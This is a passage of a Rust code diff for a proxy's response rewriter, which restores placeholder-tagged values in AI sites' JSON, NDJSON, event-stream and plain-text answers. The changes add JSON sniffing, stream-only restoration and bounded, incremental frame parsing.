@@ -11,9 +11,17 @@
 //!   restored and the document re-serialised; `)]}'`-prefixed JSON-in-text
 //!   (Gemini) line by line; larger documents through the JSON fragment
 //!   restorer. A body that is not JSON passes through.
-//! - `text/plain`: one stream restorer.
+//! - `text/plain`: one stream restorer, unless the body starts like JSON
+//!   (up to a string or an object, or a JSON value followed by another on a
+//!   later line): then it is restored as `application/json` is, or passes
+//!   through, never as text.
 //! - Anything else (HTML included) passes through untouched: AI sites
 //!   render answers from JSON and event streams, where values are text.
+//!
+//! Which answers are restored at all is decided per endpoint
+//! ([`crate::sites::restore_rule`]); [`for_stream_only`] is the rewriter for
+//! sites whose answers are restored only when they stream (a single JSON
+//! document or a text body passes through there).
 //!
 //! Real values only ever land inside parsed JSON strings (re-serialised),
 //! JSON-escaped in streamed JSON fragments, or in plain text; JSON carried
@@ -26,7 +34,8 @@
 //! the same path carries it on, or, at a stop event or the end of the
 //! stream, it is flushed into that held event. No event is invented.
 
-use std::collections::{HashMap, HashSet, VecDeque};
+use std::collections::{BTreeMap, HashSet, VecDeque};
+use std::ops::Bound;
 
 use bytes::Bytes;
 use parda_engine::{Engine, StreamRestorer};
@@ -54,6 +63,20 @@ const TEXT_KEY: &str = "\u{0}text";
 const MAX_NESTED_JSON: usize = 4;
 /// Keys whose streamed values are fragments of a JSON document.
 const JSON_DELTA_KEYS: &[&str] = &["partial_json", "arguments"];
+/// The longest restorer key (event name, `index` and JSON path): a leaf
+/// with a longer one is restored on its own, without a stream restorer.
+const MAX_KEY_LEN: usize = 512;
+/// New stream restorers one item may start, at most (its other new leaves
+/// are restored on their own).
+const MAX_NEW_TRACKS: usize = 1024;
+/// Stream restorers kept for a stream before the longest-unused ones that
+/// hold nothing back are dropped (down to half).
+const MAX_TRACKS: usize = 4096;
+/// Bytes of previous values kept for snapshot detection, at most (then the
+/// longest-unused tracks that hold nothing back are dropped, down to half).
+const MAX_RETAINED: usize = 16 * 1024 * 1024;
+/// The longest `index` value that is part of a restorer key.
+const MAX_INDEX_LEN: usize = 32;
 
 /// A rewriter for one response body of type `content_type`.
 pub(crate) fn for_content_type(
@@ -72,6 +95,30 @@ pub(crate) fn for_content_type_capped(
     scope: &str,
     content_type: &str,
     cap: usize,
+) -> Box<dyn StreamTransform> {
+    build(engine, scope, content_type, cap, true)
+}
+
+/// A rewriter for one streamed answer: like [`for_content_type`] for
+/// `text/event-stream`, NDJSON and several JSON values under a JSON type,
+/// but a single JSON document (Google frames included), a text body or any
+/// other type passes through unrestored.
+pub(crate) fn for_stream_only(
+    engine: &Engine,
+    scope: &str,
+    content_type: &str,
+) -> Box<dyn StreamTransform> {
+    build(engine, scope, content_type, MAX_ITEM_BYTES, false)
+}
+
+/// The rewriter for `content_type`; `documents`: whether single JSON
+/// documents and text bodies are restored too.
+fn build(
+    engine: &Engine,
+    scope: &str,
+    content_type: &str,
+    cap: usize,
+    documents: bool,
 ) -> Box<dyn StreamTransform> {
     let media = content_type
         .split(';')
@@ -92,17 +139,12 @@ pub(crate) fn for_content_type_capped(
         | "application/x-jsonlines"
         | "application/stream+json" => Box::new(NdjsonRestore::new(engine, scope, cap)),
         m if m == "application/json" || m == "text/json" || m.ends_with("+json") => {
-            Box::new(JsonRestore {
-                engine: engine.clone(),
-                scope: scope.to_string(),
-                cap,
-                mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
-            })
+            Box::new(JsonRestore::new(engine, scope, cap, documents))
         }
-        "text/plain" => Box::new(PlainRestore {
+        "text/plain" if documents => Box::new(PlainRestore {
             engine: engine.clone(),
             scope: scope.to_string(),
-            mode: PlainMode::Sniff(Vec::new()),
+            mode: PlainMode::Sniff(Vec::new(), 0),
         }),
         _ => Box::new(Passthrough),
     }
@@ -131,10 +173,74 @@ impl StreamTransform for Passthrough {
 }
 
 /// Plain text, or JSON text (real values are JSON-escaped); tags inside
-/// URLs are left alone either way.
+/// URLs are left alone either way. A text that may be either is held back
+/// until its start tells ([`sniff_text`]).
 enum TextRestorer {
     Plain(Guarded<StreamRestorer>),
     Json(JsonFragRestorer),
+    Sniff(Box<Sniff>),
+}
+
+/// A text not decided yet: everything seen so far (bounded by
+/// [`SNIFF_MAX`]), of which the first `emitted` bytes went out unrestored
+/// (a forced flush).
+struct Sniff {
+    engine: Engine,
+    scope: String,
+    seen: String,
+    emitted: usize,
+}
+
+/// Whitespace between JSON tokens.
+const JSON_WS: [char; 4] = [' ', '\t', '\n', '\r'];
+
+/// What a streamed text is.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum TextKind {
+    Plain,
+    Json,
+}
+
+/// Decide what a streamed text is from its start `text` (all of it when
+/// `end`), or `None` to wait. JSON text is one that reads as JSON up to a
+/// string or an object (`{"`, `["`, `[{`, and then however it goes on), or
+/// a value followed by another on a later line; a text that stops being
+/// JSON before that (`[NAME_1]`, `[1] see`, `{ is`) is plain. Only the
+/// first [`SNIFF_MAX`] bytes are read, so the answer never depends on how
+/// the text was split.
+fn sniff_text(text: &str, end: bool) -> Option<TextKind> {
+    let t = text
+        .trim_start_matches('\u{feff}')
+        .trim_start_matches(JSON_WS);
+    if !t.starts_with(['{', '[']) {
+        return (end || !t.is_empty()).then_some(TextKind::Plain);
+    }
+    let mut cut = t.len().min(SNIFF_MAX);
+    while !t.is_char_boundary(cut) {
+        cut -= 1;
+    }
+    let head = &t[..cut];
+    let decided = match json_start(head) {
+        JsonStart::Clear | JsonStart::Broken => Some(TextKind::Json),
+        JsonStart::Not => Some(TextKind::Plain),
+        JsonStart::Open => None,
+        // A whole value that held a string or an object is JSON.
+        JsonStart::Closed(_, true) => Some(TextKind::Json),
+        JsonStart::Closed(at, false) => match after_value(&head[at..]) {
+            Some(PlainKind::Json) => Some(TextKind::Json),
+            Some(_) => Some(TextKind::Plain),
+            None => None,
+        },
+    };
+    decided.or(if t.len() > SNIFF_MAX {
+        // Still JSON so far, and long: JSON.
+        Some(TextKind::Json)
+    } else if end {
+        // Brackets, numbers and literals only: nothing to restore either way.
+        Some(TextKind::Plain)
+    } else {
+        None
+    })
 }
 
 impl TextRestorer {
@@ -149,17 +255,69 @@ impl TextRestorer {
         })))
     }
 
+    /// Plain or JSON text, as its start tells.
+    fn sniffing(engine: &Engine, scope: &str) -> Self {
+        TextRestorer::Sniff(Box::new(Sniff {
+            engine: engine.clone(),
+            scope: scope.to_string(),
+            seen: String::new(),
+            emitted: 0,
+        }))
+    }
+
     fn push(&mut self, text: &str) -> String {
         match self {
             TextRestorer::Plain(r) => r.push(text),
             TextRestorer::Json(r) => r.push(text),
+            TextRestorer::Sniff(s) => {
+                s.seen.push_str(text);
+                match sniff_text(&s.seen, false) {
+                    Some(kind) => self.decide(kind),
+                    None => String::new(),
+                }
+            }
         }
+    }
+
+    /// Leave sniffing as `kind`: the text that went out unrestored is the
+    /// new restorer's context, the rest is restored.
+    fn decide(&mut self, kind: TextKind) -> String {
+        let TextRestorer::Sniff(s) = self else {
+            return String::new();
+        };
+        let mut r = match kind {
+            TextKind::Plain => TextRestorer::plain(&s.engine, &s.scope),
+            TextKind::Json => TextRestorer::json(&s.engine, &s.scope),
+        };
+        let (done, rest) = s.seen.split_at(s.emitted);
+        match &mut r {
+            TextRestorer::Plain(p) => p.skip(done),
+            TextRestorer::Json(j) => {
+                let _ = j.push(done);
+            }
+            TextRestorer::Sniff(_) => {}
+        }
+        let out = r.push(rest);
+        *self = r;
+        out
     }
 
     fn finish(&mut self) -> String {
         match self {
             TextRestorer::Plain(r) => r.finish(),
             TextRestorer::Json(r) => r.finish(),
+            TextRestorer::Sniff(s) => {
+                if let Some(kind) = sniff_text(&s.seen, false) {
+                    let mut out = self.decide(kind);
+                    out.push_str(&self.finish());
+                    return out;
+                }
+                // Still undecided (brackets and numbers so far): it goes out
+                // as it came, and the text goes on being sniffed.
+                let out = s.seen[s.emitted..].to_string();
+                s.emitted = s.seen.len();
+                out
+            }
         }
     }
 
@@ -167,6 +325,30 @@ impl TextRestorer {
         match self {
             TextRestorer::Plain(r) => r.pending_len(),
             TextRestorer::Json(r) => r.pending_len(),
+            TextRestorer::Sniff(s) => s.seen.len() - s.emitted,
+        }
+    }
+
+    fn is_sniffing(&self) -> bool {
+        matches!(self, TextRestorer::Sniff(_))
+    }
+
+    /// `text` went out without this restorer (restored on its own): context
+    /// for what comes next. Nothing is held back after it.
+    fn skip(&mut self, text: &str) {
+        match self {
+            TextRestorer::Plain(r) => r.skip(text),
+            TextRestorer::Json(r) => {
+                let _ = r.push(text);
+                let _ = r.finish();
+            }
+            TextRestorer::Sniff(s) => {
+                s.seen.push_str(text);
+                s.emitted = s.seen.len();
+                if let Some(kind) = sniff_text(&s.seen, false) {
+                    let _ = self.decide(kind);
+                }
+            }
         }
     }
 }
@@ -233,21 +415,123 @@ impl StreamTransform for TextStream {
 }
 
 enum PlainMode {
-    /// Nothing but whitespace yet.
-    Sniff(Vec<u8>),
-    /// Starts like a JSON document: buffered until the end.
-    Buffer(Vec<u8>),
+    /// Not decided yet (leading whitespace, or the start of what may be
+    /// JSON), and how many leading bytes are known to be a BOM or
+    /// whitespace (read once).
+    Sniff(Vec<u8>, usize),
     Text(TextStream),
+    /// Starts like JSON: restored as one document or as JSON lines, or
+    /// passed through, never as text.
+    Json(JsonRestore),
     /// Too large to buffer: passed through.
     Raw,
 }
 
-/// `text/plain`: text, unless it is a JSON document (sites serve JSON as
-/// text/plain too), which is restored as one.
+/// The longest start of a text/plain answer read to decide whether it is
+/// JSON; past it, a start that is still JSON so far counts as JSON.
+const SNIFF_MAX: usize = 1024;
+
+/// What a text/plain answer is, from its start.
+#[derive(Debug, PartialEq, Eq)]
+enum PlainKind {
+    Text,
+    Json,
+    /// Only whitespace, at the end.
+    Blank,
+}
+
+/// Decide what `buf` (the start of a text/plain answer; all of it when
+/// `end`) is, or `None` to wait for more. JSON is a start that reads as
+/// JSON up to a string or an object (`{"`, `["`, `[{`), a JSON string
+/// literal on its own, or a JSON value followed by another on a later line;
+/// anything that stops being JSON before that is text (`[NAME_1] said`,
+/// `[1] see`, `"Hi" said`).
+fn sniff_plain(buf: &[u8], end: bool) -> Option<PlainKind> {
+    let body = buf.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(buf);
+    let lead = body.iter().take_while(|b| b.is_ascii_whitespace()).count();
+    let rest = &body[lead..];
+    let t = match std::str::from_utf8(rest) {
+        Ok(t) => t,
+        Err(e) if e.error_len().is_none() => {
+            std::str::from_utf8(&rest[..e.valid_up_to()]).unwrap_or("")
+        }
+        Err(_) => return Some(PlainKind::Text),
+    };
+    let more = |t: &str| (end || t.len() > SNIFF_MAX).then_some(PlainKind::Json);
+    match t.chars().next() {
+        None if end => Some(PlainKind::Blank),
+        None => None,
+        Some('{' | '[') => match json_start(t) {
+            JsonStart::Clear | JsonStart::Broken => Some(PlainKind::Json),
+            JsonStart::Open => more(t),
+            JsonStart::Not => Some(PlainKind::Text),
+            JsonStart::Closed(at, _) => after_value(&t[at..]).or_else(|| more(t)),
+        },
+        Some('"') => match string_end(t) {
+            Some(at) => after_value(&t[at..]).or_else(|| more(t)),
+            None => more(t),
+        },
+        Some(_) => Some(PlainKind::Text),
+    }
+}
+
+/// After a complete JSON value: another value on a later line makes JSON
+/// lines, other text makes it all text; `None` while only whitespace
+/// follows.
+fn after_value(rest: &str) -> Option<PlainKind> {
+    let ws = rest.len() - rest.trim_start().len();
+    match rest[ws..].chars().next() {
+        None => None,
+        Some('{' | '[' | '"') if rest[..ws].contains('\n') => Some(PlainKind::Json),
+        Some(_) => Some(PlainKind::Text),
+    }
+}
+
+/// Where the JSON string literal `t` starts with ends (after its closing
+/// quote), if it does.
+fn string_end(t: &str) -> Option<usize> {
+    let b = t.as_bytes();
+    let mut i = 1;
+    while i < b.len() {
+        match b[i] {
+            b'\\' => i += 2,
+            b'"' => return Some(i + 1),
+            _ => i += 1,
+        }
+    }
+    None
+}
+
+/// `text/plain`: text, unless it starts like JSON (sites serve JSON as
+/// text/plain too), which is restored as JSON or passes through.
 struct PlainRestore {
     engine: Engine,
     scope: String,
     mode: PlainMode,
+}
+
+impl PlainRestore {
+    /// Leave sniffing as `kind`, sending what was held.
+    fn decide(&mut self, kind: PlainKind, held: Vec<u8>) -> Vec<u8> {
+        match kind {
+            PlainKind::Blank => {
+                self.mode = PlainMode::Raw;
+                held
+            }
+            PlainKind::Text => {
+                let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
+                let out = t.push_bytes(&held);
+                self.mode = PlainMode::Text(t);
+                out
+            }
+            PlainKind::Json => {
+                let mut j = JsonRestore::new(&self.engine, &self.scope, MAX_ITEM_BYTES, true);
+                let out = j.push(&held).to_vec();
+                self.mode = PlainMode::Json(j);
+                out
+            }
+        }
+    }
 }
 
 impl StreamTransform for PlainRestore {
@@ -255,35 +539,25 @@ impl StreamTransform for PlainRestore {
         match &mut self.mode {
             PlainMode::Raw => Bytes::copy_from_slice(chunk),
             PlainMode::Text(t) => Bytes::from(t.push_bytes(chunk)),
-            PlainMode::Buffer(buf) => {
+            PlainMode::Json(j) => j.push(chunk),
+            PlainMode::Sniff(buf, lead) => {
                 buf.extend_from_slice(chunk);
-                if buf.len() <= MAX_JSON_BUFFER {
-                    return Bytes::new();
+                if *lead == 0 && buf.starts_with(b"\xEF\xBB\xBF") {
+                    *lead = 3;
                 }
-                let out = std::mem::take(buf);
-                self.mode = PlainMode::Raw;
-                Bytes::from(out)
-            }
-            PlainMode::Sniff(buf) => {
-                buf.extend_from_slice(chunk);
-                let first = buf
-                    .iter()
-                    .position(|b| !b.is_ascii_whitespace() && !b"\xef\xbb\xbf".contains(b));
-                match first.map(|i| buf[i]) {
-                    None => Bytes::new(),
-                    Some(b'{' | b'[') => {
-                        let held = std::mem::take(buf);
-                        self.mode = PlainMode::Buffer(Vec::new());
-                        self.push(&held)
-                    }
-                    Some(_) => {
-                        let held = std::mem::take(buf);
-                        let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
-                        let out = t.push_bytes(&held);
-                        self.mode = PlainMode::Text(t);
-                        Bytes::from(out)
+                if *lead > 0 || buf.len() >= 3 || !b"\xEF\xBB\xBF".starts_with(buf) {
+                    while *lead < buf.len() && buf[*lead].is_ascii_whitespace() {
+                        *lead += 1;
                     }
                 }
+                let kind = match sniff_plain(&buf[*lead..], false) {
+                    Some(kind) => kind,
+                    // Only whitespace, more than a document can be.
+                    None if buf.len() > MAX_JSON_BUFFER => PlainKind::Blank,
+                    None => return Bytes::new(),
+                };
+                let held = std::mem::take(buf);
+                Bytes::from(self.decide(kind, held))
             }
         }
     }
@@ -291,19 +565,14 @@ impl StreamTransform for PlainRestore {
     fn finish(&mut self) -> Bytes {
         match std::mem::replace(&mut self.mode, PlainMode::Raw) {
             PlainMode::Raw => Bytes::new(),
-            PlainMode::Sniff(buf) => Bytes::from(buf),
             PlainMode::Text(mut t) => Bytes::from(t.finish_bytes()),
-            PlainMode::Buffer(buf) => match parda_wire::body::parse_json(&buf) {
-                Ok(v) => Bytes::from(
-                    restore_json_value(&self.engine, &self.scope, &buf, v).unwrap_or(buf),
-                ),
-                Err(_) => {
-                    let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
-                    let mut out = t.push_bytes(&buf);
-                    out.extend(t.finish_bytes());
-                    Bytes::from(out)
-                }
-            },
+            PlainMode::Json(mut j) => j.finish(),
+            PlainMode::Sniff(buf, _) => {
+                let kind = sniff_plain(&buf, true).unwrap_or(PlainKind::Blank);
+                let mut out = self.decide(kind, buf);
+                out.extend_from_slice(&self.finish());
+                Bytes::from(out)
+            }
         }
     }
 }
@@ -316,6 +585,8 @@ enum JsonMode {
     Frames(Frames),
     /// Several JSON values one per line: an NDJSON stream after all.
     Lines(NdjsonRestore),
+    /// Passed through unrestored (a document where only streams are).
+    Raw,
 }
 
 /// Where the first top-level JSON value of a body ends, and whether
@@ -390,7 +661,22 @@ struct JsonRestore {
     engine: Engine,
     scope: String,
     cap: usize,
+    /// False: only a stream of JSON values is restored; one document (or
+    /// Google frames) passes through as it came.
+    documents: bool,
     mode: JsonMode,
+}
+
+impl JsonRestore {
+    fn new(engine: &Engine, scope: &str, cap: usize, documents: bool) -> Self {
+        JsonRestore {
+            engine: engine.clone(),
+            scope: scope.to_string(),
+            cap,
+            documents,
+            mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
+        }
+    }
 }
 
 impl StreamTransform for JsonRestore {
@@ -399,14 +685,19 @@ impl StreamTransform for JsonRestore {
             JsonMode::Stream(s) => return Bytes::from(s.push_bytes(chunk)),
             JsonMode::Frames(f) => return Bytes::from(f.push(chunk)),
             JsonMode::Lines(l) => return l.push(chunk),
+            JsonMode::Raw => return Bytes::copy_from_slice(chunk),
             JsonMode::Buffer(buf, top) => {
                 buf.extend_from_slice(chunk);
                 (buf, top)
             }
         };
         if buf.len() >= XSSI_PREFIX.len() && buf.starts_with(XSSI_PREFIX) {
-            // JSON inside text, sent in pieces: frame by frame.
             let held = std::mem::take(buf);
+            if !self.documents {
+                self.mode = JsonMode::Raw;
+                return Bytes::from(held);
+            }
+            // JSON inside text, sent in pieces: frame by frame.
             let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
             let out = frames.push(&held);
             self.mode = JsonMode::Frames(frames);
@@ -419,6 +710,12 @@ impl StreamTransform for JsonRestore {
             let out = lines.push(&held);
             self.mode = JsonMode::Lines(lines);
             return out;
+        }
+        if !self.documents && (top.scalar || buf.len() > MAX_JSON_BUFFER) {
+            // One value, never restored here: no need to hold it longer.
+            let held = std::mem::take(buf);
+            self.mode = JsonMode::Raw;
+            return Bytes::from(held);
         }
         if buf.len() <= MAX_JSON_BUFFER {
             return Bytes::new();
@@ -435,8 +732,12 @@ impl StreamTransform for JsonRestore {
             JsonMode::Stream(s) => Bytes::from(s.finish_bytes()),
             JsonMode::Frames(f) => Bytes::from(f.finish()),
             JsonMode::Lines(l) => l.finish(),
+            JsonMode::Raw => Bytes::new(),
             JsonMode::Buffer(buf, _) => {
                 let raw = std::mem::take(buf);
+                if !self.documents {
+                    return Bytes::from(raw);
+                }
                 if raw.starts_with(XSSI_PREFIX) {
                     let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
                     let mut out = frames.push(&raw);
@@ -468,29 +769,76 @@ fn restore_json_value(engine: &Engine, scope: &str, raw: &[u8], mut v: Value) ->
     changed.then(|| preserve_numbers(raw, serde_json::to_vec(&v).unwrap_or_default()))
 }
 
-/// A JSON object or array carried in a string, if `s` is one.
-fn json_container(s: &str) -> Option<Value> {
-    let t = s.trim();
-    let bracketed =
-        (t.starts_with('{') && t.ends_with('}')) || (t.starts_with('[') && t.ends_with(']'));
-    if !bracketed {
-        return None;
+/// What a string holds, read as JSON.
+enum JsonIn {
+    /// A JSON object or array (parsed as browsers do: a BOM, lone
+    /// surrogates).
+    Container(Value),
+    /// The start of JSON that has not ended (`{"q": "x`): more may follow.
+    Incomplete,
+    /// Clearly JSON (it reached a string or an object, see [`sniff_text`])
+    /// that cannot become one valid document (`{"a": 1,}`, a value followed
+    /// by another).
+    Invalid,
+    Text,
+}
+
+/// Does `v` hold a string or an object anywhere?
+fn holds_text(v: &Value) -> bool {
+    match v {
+        Value::String(_) | Value::Object(_) => true,
+        Value::Array(items) => items.iter().any(holds_text),
+        _ => false,
     }
-    serde_json::from_str::<Value>(t)
-        .ok()
-        .filter(|v| v.is_object() || v.is_array())
+}
+
+fn json_in(s: &str) -> JsonIn {
+    let t = s.trim_start_matches('\u{feff}').trim_matches(JSON_WS);
+    if !t.starts_with(['{', '[']) {
+        return JsonIn::Text;
+    }
+    if let Ok(v) = parda_wire::body::parse_json(t.as_bytes())
+        && (v.is_object() || v.is_array())
+    {
+        // Brackets and numbers only (`[1]`) hold nothing to restore and
+        // read as text (a citation, a list marker).
+        return if holds_text(&v) {
+            JsonIn::Container(v)
+        } else {
+            JsonIn::Text
+        };
+    }
+    match json_start(t) {
+        JsonStart::Clear => JsonIn::Incomplete,
+        JsonStart::Broken => JsonIn::Invalid,
+        // A value that ended, then more: lines of JSON, or text after a
+        // value that was clearly JSON.
+        JsonStart::Closed(at, clear) => match after_value(&t[at..]) {
+            Some(PlainKind::Text) if !clear => JsonIn::Text,
+            _ => JsonIn::Invalid,
+        },
+        // Brackets and numbers only, or prose (`[NAME_1] said`).
+        JsonStart::Open | JsonStart::Not => JsonIn::Text,
+    }
 }
 
 /// Restore one whole string value in place. JSON inside it is restored at
-/// its own level (so a real value is escaped where it lands); in text, tags
-/// inside URLs stay tags. Returns whether it changed.
+/// its own level (so a real value is escaped where it lands), and a string
+/// that is clearly JSON but does not parse is left alone, never restored as
+/// text; in text, tags inside URLs stay tags. Returns whether it changed.
 fn restore_string(engine: &Engine, scope: &str, s: &mut String, depth: usize) -> bool {
     if s.is_empty() {
         return false;
     }
-    if depth < MAX_NESTED_JSON
-        && let Some(mut inner) = json_container(s)
-    {
+    let inner = if depth < MAX_NESTED_JSON {
+        json_in(s)
+    } else {
+        JsonIn::Text
+    };
+    if let JsonIn::Incomplete | JsonIn::Invalid = inner {
+        return false;
+    }
+    if let JsonIn::Container(mut inner) = inner {
         let mut changed = false;
         leaves(&mut inner, &mut |t: &mut String| {
             changed |= restore_string(engine, scope, t, depth + 1);
@@ -521,47 +869,83 @@ struct Frames {
     engine: Engine,
     scope: String,
     cap: usize,
+    /// Bytes not yet sent; consumed ones are dropped once per push.
     buf: Vec<u8>,
     prefix_done: bool,
+    /// The frame being read, once its length is known.
+    frame: Option<FrameScan>,
     /// Gave up on framing: the rest passes through.
     raw: bool,
 }
 
-/// How many bytes of `bytes` hold exactly `units` UTF-16 code units.
-enum Utf16Prefix {
-    Bytes(usize),
+/// How far a frame's payload has been measured: every byte is read once,
+/// whatever the chunking.
+#[derive(Debug, Clone, Copy)]
+struct FrameScan {
+    digits: usize,
+    /// The payload length in UTF-16 code units.
+    units: usize,
+    /// Payload bytes measured so far (whole characters).
+    bytes: usize,
+    /// UTF-16 code units in them.
+    counted: usize,
+}
+
+/// Where measuring a payload got to.
+#[derive(Debug, PartialEq, Eq)]
+enum Measure {
+    /// The payload is this many bytes.
+    Done(usize),
     /// More bytes are needed.
     Need,
     /// Not valid (bad UTF-8, or the count ends inside a character).
     Invalid,
 }
 
-fn utf16_prefix(bytes: &[u8], units: usize) -> Utf16Prefix {
-    let (text, rest_invalid) = match std::str::from_utf8(bytes) {
-        Ok(t) => (t, false),
-        Err(e) => (
-            std::str::from_utf8(&bytes[..e.valid_up_to()]).unwrap_or_default(),
-            e.error_len().is_some(),
-        ),
-    };
-    let mut count = 0;
-    for (i, c) in text.char_indices() {
-        if count == units {
-            return Utf16Prefix::Bytes(i);
+impl FrameScan {
+    /// Count on through `payload` (the frame's payload bytes received so
+    /// far), reading only bytes not measured before and no further than the
+    /// frame can reach (a UTF-16 code unit is at most 4 UTF-8 bytes).
+    fn measure(&mut self, payload: &[u8]) -> Measure {
+        loop {
+            if self.counted == self.units {
+                return Measure::Done(self.bytes);
+            }
+            let new = &payload[self.bytes..];
+            let reach = (self.units - self.counted)
+                .saturating_mul(4)
+                .saturating_add(4);
+            let window = &new[..new.len().min(reach)];
+            let (text, invalid) = match std::str::from_utf8(window) {
+                Ok(t) => (t, false),
+                Err(e) => (
+                    std::str::from_utf8(&window[..e.valid_up_to()]).unwrap_or_default(),
+                    e.error_len().is_some(),
+                ),
+            };
+            for c in text.chars() {
+                self.counted += c.len_utf16();
+                self.bytes += c.len_utf8();
+                if self.counted == self.units {
+                    return Measure::Done(self.bytes);
+                }
+                if self.counted > self.units {
+                    return Measure::Invalid;
+                }
+            }
+            if invalid {
+                return Measure::Invalid;
+            }
+            if window.len() == new.len() {
+                // All received bytes read (a character may be incomplete).
+                return Measure::Need;
+            }
         }
-        count += c.len_utf16();
-        if count > units {
-            return Utf16Prefix::Invalid;
-        }
-    }
-    if count == units {
-        Utf16Prefix::Bytes(text.len())
-    } else if rest_invalid {
-        Utf16Prefix::Invalid
-    } else {
-        Utf16Prefix::Need
     }
 }
+
+/// At most this many digits in a frame length.
+const MAX_FRAME_DIGITS: usize = 12;
 
 impl Frames {
     fn new(engine: &Engine, scope: &str, cap: usize) -> Self {
@@ -571,6 +955,7 @@ impl Frames {
             cap,
             buf: Vec::new(),
             prefix_done: false,
+            frame: None,
             raw: false,
         }
     }
@@ -581,48 +966,85 @@ impl Frames {
         }
         self.buf.extend_from_slice(chunk);
         let mut out = Vec::new();
+        let used = self.frames(&mut out);
+        if self.raw {
+            out.extend_from_slice(&self.buf[used..]);
+            self.buf = Vec::new();
+        } else {
+            self.buf.drain(..used);
+        }
+        out
+    }
+
+    /// Restore every complete frame of `buf` into `out`; returns how many
+    /// bytes of `buf` were used (sets `raw` on giving up).
+    fn frames(&mut self, out: &mut Vec<u8>) -> usize {
+        let mut at = 0;
         loop {
+            let rest = &self.buf[at..];
             if !self.prefix_done {
                 // `)]}'` and its line ending.
-                match self.buf.iter().position(|&b| b == b'\n') {
+                match rest.iter().take(65).position(|&b| b == b'\n') {
                     Some(i) => {
-                        out.extend(self.buf.drain(..=i));
+                        out.extend_from_slice(&rest[..=i]);
+                        at += i + 1;
                         self.prefix_done = true;
                         continue;
                     }
-                    None if self.buf.len() > 64 => return self.give_up(out),
-                    None => return out,
+                    None if rest.len() > 64 => return self.give_up(at),
+                    None => return at,
                 }
             }
-            let ws = self
-                .buf
-                .iter()
-                .take_while(|b| b.is_ascii_whitespace())
-                .count();
-            out.extend(self.buf.drain(..ws));
-            if self.buf.is_empty() {
-                return out;
-            }
-            let digits = self.buf.iter().take_while(|b| b.is_ascii_digit()).count();
-            if digits == 0 || digits > 12 {
-                return self.give_up(out);
-            }
-            if digits == self.buf.len() {
-                return out;
-            }
-            let Ok(units) = std::str::from_utf8(&self.buf[..digits])
-                .unwrap_or("")
-                .parse::<usize>()
-            else {
-                return self.give_up(out);
+            let scan = match self.frame {
+                Some(scan) => scan,
+                None => {
+                    let ws = rest.iter().take_while(|b| b.is_ascii_whitespace()).count();
+                    out.extend_from_slice(&rest[..ws]);
+                    at += ws;
+                    let rest = &rest[ws..];
+                    if rest.is_empty() {
+                        return at;
+                    }
+                    let digits = rest
+                        .iter()
+                        .take(MAX_FRAME_DIGITS + 1)
+                        .take_while(|b| b.is_ascii_digit())
+                        .count();
+                    if digits == 0 || digits > MAX_FRAME_DIGITS {
+                        return self.give_up(at);
+                    }
+                    if digits == rest.len() {
+                        return at;
+                    }
+                    let Ok(units) = std::str::from_utf8(&rest[..digits])
+                        .unwrap_or("")
+                        .parse::<usize>()
+                    else {
+                        return self.give_up(at);
+                    };
+                    FrameScan {
+                        digits,
+                        units,
+                        bytes: 0,
+                        counted: 0,
+                    }
+                }
             };
-            let n = match utf16_prefix(&self.buf[digits..], units) {
-                Utf16Prefix::Bytes(n) => n,
-                Utf16Prefix::Need if self.buf.len() <= self.cap => return out,
-                _ => return self.give_up(out),
-            };
-            let frame: Vec<u8> = self.buf.drain(..digits + n).collect();
-            out.extend(self.restore_frame(&frame, digits));
+            let mut scan = scan;
+            let rest = &self.buf[at..];
+            match scan.measure(&rest[scan.digits..]) {
+                Measure::Done(n) => {
+                    let frame = &rest[..scan.digits + n];
+                    out.extend(self.restore_frame(frame, scan.digits));
+                    at += scan.digits + n;
+                    self.frame = None;
+                }
+                Measure::Need if rest.len() <= self.cap => {
+                    self.frame = Some(scan);
+                    return at;
+                }
+                _ => return self.give_up(at),
+            }
         }
     }
 
@@ -648,13 +1070,15 @@ impl Frames {
         out
     }
 
-    fn give_up(&mut self, mut out: Vec<u8>) -> Vec<u8> {
-        out.append(&mut self.buf);
+    /// Stop framing: what is left of `buf` from `at` on passes as it came.
+    fn give_up(&mut self, at: usize) -> usize {
         self.raw = true;
-        out
+        self.frame = None;
+        at
     }
 
     fn finish(&mut self) -> Vec<u8> {
+        self.frame = None;
         std::mem::take(&mut self.buf)
     }
 }
@@ -728,18 +1152,27 @@ impl StreamTransform for NdjsonRestore {
         }
         self.buf.extend_from_slice(chunk);
         let mut out = Vec::new();
-        while let Some(i) = self.buf[self.scanned..].iter().position(|&b| b == b'\n') {
-            let line: Vec<u8> = self.buf.drain(..self.scanned + i + 1).collect();
+        // Lines are taken from `start` on; the buffer is shifted once.
+        let mut start = 0;
+        while let Some(i) = self.buf[start + self.scanned..]
+            .iter()
+            .position(|&b| b == b'\n')
+        {
+            let end = start + self.scanned + i + 1;
+            let line = self.buf[start..end].to_vec();
+            start = end;
             self.scanned = 0;
             if line.len() > self.cap {
                 render_all(self.events.finish(), &mut out);
                 out.extend(line);
-                out.append(&mut self.buf);
+                out.extend_from_slice(&self.buf[start..]);
+                self.buf = Vec::new();
                 self.raw = true;
                 return Bytes::from(out);
             }
             render_all(self.events.on_item(Item::line(line)), &mut out);
         }
+        self.buf.drain(..start);
         self.scanned = self.buf.len();
         if self.buf.len() > self.cap {
             render_all(self.events.finish(), &mut out);
@@ -893,43 +1326,76 @@ fn pointer_mut<'a>(v: &'a mut Value, path: &[Seg]) -> Option<&'a mut Value> {
     Some(cur)
 }
 
-/// The paths of every string leaf of `v`, in document order.
-fn leaf_paths(v: &Value, path: &mut Vec<Seg>, out: &mut Vec<Vec<Seg>>) {
-    match v {
-        Value::String(_) => out.push(path.clone()),
-        Value::Array(items) => {
-            for (i, x) in items.iter().enumerate() {
-                path.push(Seg::Index(i));
-                leaf_paths(x, path, out);
-                path.pop();
-            }
+/// Where a leaf sits, while its restorer key is being built.
+#[derive(Clone, Copy)]
+enum LeafAt<'a> {
+    Json(&'a [Seg]),
+    Data,
+}
+
+impl LeafAt<'_> {
+    fn to_leaf(self) -> Leaf {
+        match self {
